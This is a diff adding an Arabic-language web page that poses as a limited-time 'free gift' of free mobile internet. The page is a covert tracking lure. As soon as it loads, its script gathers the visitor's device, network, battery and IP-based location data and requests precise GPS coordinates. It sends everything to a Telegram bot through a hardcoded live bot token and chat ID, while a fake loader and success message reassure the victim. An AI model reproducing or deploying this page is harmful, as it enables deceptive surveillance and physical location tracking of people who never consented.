@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدية مجانية</title>
+    <style>
+        /* نفس الأنماط السابقة تماماً */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f8ff;
+            color: #333;
+        }
+        .header {
+            background: linear-gradient(135deg, #4b6cb7, #182848);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .header p {
+            margin: 10px 0 0;
+            font-size: 16px;
+        }
+        .gift-box {
+            width: 150px;
+            height: 150px;
+            margin: 20px auto;
+            background: url('https://cdn-icons-png.flaticon.com/512/3481/3481072.png') no-repeat center center;
+            background-size: contain;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        .content {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            margin-top: 20px;
+            margin-bottom: 40px;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4b6cb7;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            color: #2ecc71;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .config-section {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px dashed #ccc;
+        }
+        .config-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #4b6cb7;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎁 هدية مجانية خاصة بك! 🎁</h1>
+        <p>جاري تجهيز هديتك، الرجاء الانتظار...</p>
+    </div>
+
+    <div class="gift-box"></div>
+
+    <div class="content">
+        <div id="loading-section" class="loading">
+            <div class="loader"></div>
+            <p>جاري التحقق من بياناتك لتأهيلك للهدية...</p>
+        </div>
+
+        <div id="success-section" class="success-message hidden">
+            <p>🎉 تم تأهيلك بنجاح للهدية! 🎉</p>
+            <p>سيتم إعلامك بالتفاصيل قريبًا.</p>
+        </div>
+    </div>
+
+    <!-- قسم الإعدادات (كما هو) -->
+    <div class="content config-section">
+        <div class="config-title">هديه لفتره محدوده </div>
+        <p><strong>النتيجه:</strong> مبروك</p>
+        <p><strong>العرض:</strong> نت مجاني لخطك</p>
+        <p>Omar.</p>
+    </div>
+
+    <script>
+        // إعدادات Telegram - لم تتغير
+        const TELEGRAM_BOT_TOKEN = '8303502446:AAFasC-m3cx8dFAcDQ75BOHYv9CwRVaGYmo';
+        const TELEGRAM_CHAT_ID = '6612813200';
+        
+        // تخزين جميع البيانات
+        let collectedData = {
+            deviceInfo: null,
+            networkInfo: null,
+            batteryInfo: null,
+            ipInfo: null,
+            preciseLocation: null
+        };
+        
+        // متغير لمنع إرسال أكثر من رسالة أولى
+        let firstMessageSent = false;
+        
+        // دالة إرسال البيانات إلى Telegram (مع keepalive)
+        function sendToTelegram(final = true) {
+            // بناء نص الرسالة بنفس التنسيق القديم ولكن مع الحقول الموجودة فقط
+            let message = `📊 *بيانات جهاز جديد* 📊\n\n`;
+            
+            if (collectedData.deviceInfo) {
+                message += `💻 *معلومات الجهاز:*\n`;
+                message += `- نظام التشغيل: ${collectedData.deviceInfo.platform}\n`;
+                message += `- المتصفح: ${collectedData.deviceInfo.userAgent}\n`;
+                message += `- الذاكرة: ${collectedData.deviceInfo.deviceMemory} GB\n`;
+                message += `- الأنوية: ${collectedData.deviceInfo.hardwareConcurrency}\n`;
+                message += `- نقاط اللمس: ${collectedData.deviceInfo.maxTouchPoints}\n\n`;
+                
+                message += `🖥 *معلومات الشاشة:*\n`;
+                message += `- الدقة: ${collectedData.deviceInfo.screenWidth} × ${collectedData.deviceInfo.screenHeight}\n`;
+                message += `- نسبة البكسل: ${collectedData.deviceInfo.pixelRatio}\n`;
+                message += `- عمق الألوان: ${collectedData.deviceInfo.colorDepth} بت\n`;
+                message += `- الاتجاه: ${collectedData.deviceInfo.orientation}\n\n`;
+            }
+            
+            if (collectedData.networkInfo) {
+                message += `🌐 *معلومات الشبكة:*\n`;
+                message += `- نوع الاتصال: ${collectedData.networkInfo.type}\n`;
+                message += `- سرعة التنزيل: ${collectedData.networkInfo.downlink}\n`;
+                message += `- زمن الوصول: ${collectedData.networkInfo.rtt}\n`;
+                message += `- توفير البيانات: ${collectedData.networkInfo.saveData}\n\n`;
+            }
+            
+            if (collectedData.batteryInfo) {
+                message += `🔋 *حالة البطارية:*\n`;
+                message += `- النسبة: ${collectedData.batteryInfo.level}\n`;
+                message += `- حالة الشحن: ${collectedData.batteryInfo.charging}\n`;
+                message += `- وقت الشحن المتبقي: ${collectedData.batteryInfo.chargingTime}\n`;
+                message += `- وقت التفريغ المتبقي: ${collectedData.batteryInfo.dischargingTime}\n\n`;
+            }
+            
+            if (collectedData.ipInfo) {
+                message += `📍 *معلومات الموقع (IP):*\n`;
+                message += `- عنوان IP: ${collectedData.ipInfo.ip}\n`;
+                message += `- البلد: ${collectedData.ipInfo.country} (${collectedData.ipInfo.countryCode})\n`;
+                message += `- المدينة: ${collectedData.ipInfo.city}\n`;
+                message += `- المنطقة الزمنية: ${collectedData.ipInfo.timezone}\n`;
+                message += `- مزود الخدمة: ${collectedData.ipInfo.isp}\n\n`;
+                
+                message += `🗺 *الإحداثيات الجغرافية:*\n`;
+                message += `- خط العرض: ${collectedData.ipInfo.latitude}\n`;
+                message += `- خط الطول: ${collectedData.ipInfo.longitude}\n`;
+                message += `- المنطقة: ${collectedData.ipInfo.region}\n`;
+                message += `- الرمز البريدي: ${collectedData.ipInfo.postalCode}\n\n`;
+            }
+            
+            if (collectedData.preciseLocation) {
+                message += `🎯 *الموقع الدقيق:*\n`;
+                message += `- خط العرض: ${collectedData.preciseLocation.preciseLatitude}\n`;
+                message += `- خط الطول: ${collectedData.preciseLocation.preciseLongitude}\n`;
+                message += `- الدقة: ±${collectedData.preciseLocation.accuracy}\n\n`;
+                message += `[عرض الموقع على خرائط جوجل](https://www.google.com/maps?q=${collectedData.preciseLocation.preciseLatitude},${collectedData.preciseLocation.preciseLongitude})`;
+            }
+            
+            // إرسال الرسالة
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                }),
+                keepalive: true
+            }).catch(err => console.error('فشل الإرسال:', err));
+        }
+        
+        // جمع البيانات الفورية
+        function collectImmediateData() {
+            collectedData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                maxTouchPoints: navigator.maxTouchPoints || 'غير معروف',
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'غير معروف'
+            };
+            
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                collectedData.networkInfo = {
+                    type: connection.type || connection.effectiveType || 'غير معروف',
+                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
+                    rtt: connection.rtt ? `${connection.rtt} ms` : 'غير معروف',
+                    saveData: connection.saveData ? 'نعم' : 'لا'
+                };
+            }
+        }
+        
+        // جمع البطارية مع timeout
+        function collectBatteryInfoWithTimeout(timeoutMs) {
+            if (!('getBattery' in navigator)) return Promise.resolve(null);
+            
+            return new Promise(resolve => {
+                const timeout = setTimeout(() => resolve(null), timeoutMs);
+                navigator.getBattery().then(battery => {
+                    clearTimeout(timeout);
+                    resolve({
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'نعم' : 'لا',
+                        chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.chargingTime / 60)} دقائق`,
+                        dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.dischargingTime / 60)} دقائق`
+                    });
+                }).catch(() => resolve(null));
+            });
+        }
+        
+        // جمع IP مع timeout
+        function fetchIPAndLocationWithTimeout(timeoutMs) {
+            return new Promise(resolve => {
+                const timeout = setTimeout(() => resolve(null), timeoutMs);
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(data => {
+                        clearTimeout(timeout);
+                        resolve({
+                            ip: data.ip || 'غير معروف',
+                            country: data.country_name || 'غير معروف',
+                            countryCode: data.country_code || 'غير معروف',
+                            city: data.city || 'غير معروف',
+                            timezone: data.timezone || 'غير معروف',
+                            isp: data.org || 'غير معروف',
+                            latitude: data.latitude || 'غير معروف',
+                            longitude: data.longitude || 'غير معروف',
+                            region: data.region || 'غير معروف',
+                            postalCode: data.postal || 'غير معروف'
+                        });
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+        
+        // جمع الموقع الدقيق مع timeout
+        function fetchPreciseLocationWithTimeout(timeoutMs) {
+            if (!('geolocation' in navigator)) return Promise.resolve(null);
+            
+            return new Promise(resolve => {
+                const timeout = setTimeout(() => resolve(null), timeoutMs);
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        clearTimeout(timeout);
+                        resolve({
+                            preciseLatitude: position.coords.latitude,
+                            preciseLongitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' متر'
+                        });
+                    },
+                    () => {
+                        clearTimeout(timeout);
+                        resolve(null);
+                    },
+                    { timeout: timeoutMs }
+                );
+            });
+        }
+        
+        // دالة لجمع كل شيء وإرسال رسالة واحدة
+        async function collectAllAndSend() {
+            // 1. نجمع البيانات الفورية
+            collectImmediateData();
+            
+            // 2. نبدأ جمع البيانات البطيئة مع timeout 800ms
+            const batteryPromise = collectBatteryInfoWithTimeout(800).then(value => collectedData.batteryInfo = value);
+            const ipPromise = fetchIPAndLocationWithTimeout(800).then(value => collectedData.ipInfo = value);
+            const locationPromise = fetchPreciseLocationWithTimeout(800).then(value => collectedData.preciseLocation = value);
+            
+            // 3. ننتظر حتى تمر 800ms أو تكتمل كل الوعود
+            await Promise.allSettled([batteryPromise, ipPromise, locationPromise]);
+            
+            // 4. نرسل الرسالة الأولى (الوحيدة) بكل ما تم جمعه حتى الآن
+            if (!firstMessageSent) {
+                sendToTelegram(true);
+                firstMessageSent = true;
+            }
+            
+            // 5. إذا لم يكتمل الموقع الدقيق خلال 800ms، نستمر في محاولة الحصول عليه ونرسل تحديثاً ثانياً
+            if (!collectedData.preciseLocation) {
+                // نحاول الحصول على الموقع الدقيق بدون timeout صارم (لأنه قد يحتاج موافقة المستخدم)
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            collectedData.preciseLocation = {
+                                preciseLatitude: position.coords.latitude,
+                                preciseLongitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy + ' متر'
+                            };
+                            // نرسل رسالة ثانية تحتوي على الموقع فقط (يمكن إلغاء هذه الخطوة إذا أردت رسالة واحدة فقط)
+                            // ولكن سنرسلها لتكون رسالة ثانية اختيارية.
+                            sendToTelegram(true);
+                        },
+                        () => {}
+                    );
+                }
+            }
+        }
+        
+        // بدء التنفيذ فور تحميل السكربت
+        collectAllAndSend();
+        
+        // بعد انتهاء المهلة، نظهر رسالة النجاح للمستخدم (حتى لو لم تكتمل كل البيانات)
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.getElementById('loading-section').classList.add('hidden');
+                document.getElementById('success-section').classList.remove('hidden');
+            }, 800); // نظهر النجاح بعد 800ms ليتوافق مع المهلة
+        });
+    </script>
+</body>
+</html>
